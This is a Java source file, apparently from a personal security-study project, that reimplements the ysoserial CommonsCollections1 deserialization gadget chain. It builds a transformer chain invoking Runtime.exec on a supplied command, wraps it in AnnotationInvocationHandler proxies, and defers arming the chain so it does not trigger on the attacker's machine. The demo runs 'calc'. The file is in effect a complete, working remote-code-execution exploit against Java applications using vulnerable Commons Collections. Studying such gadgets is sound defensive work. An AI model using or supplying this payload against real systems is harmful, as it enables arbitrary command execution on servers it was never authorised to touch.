package com.pinger.javasec.ysoserial;

import com.pinger.javasec.util.SerialUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * @author : p1n93r
 * @date : 2021/3/31 13:49
 * CC1 Gadget分析
 */
public class CC1 {

    public static InvocationHandler getObject(final String command) throws Exception {
        final String[] execArgs = new String[] { command };
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);


        // 创建AnnotationInvocationHandler对象，封装lazyMap
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);

        // 得到代理Map
        Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);

        // 再次创建AnnotationInvocationHandler对象，封装proxyMap
        InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        // 最后再将真正的transformer chain传入,防止反序列化之前在攻击机中就执行了命令
        Class<? extends Transformer> chainClass = transformerChain.getClass();
        Field iTransformers = chainClass.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain,transformers);
        return res;
    }

    public static void main(String[] args) throws Exception{
        Object object = getObject("calc");
        SerialUtil.runPayload(object);
    }






}
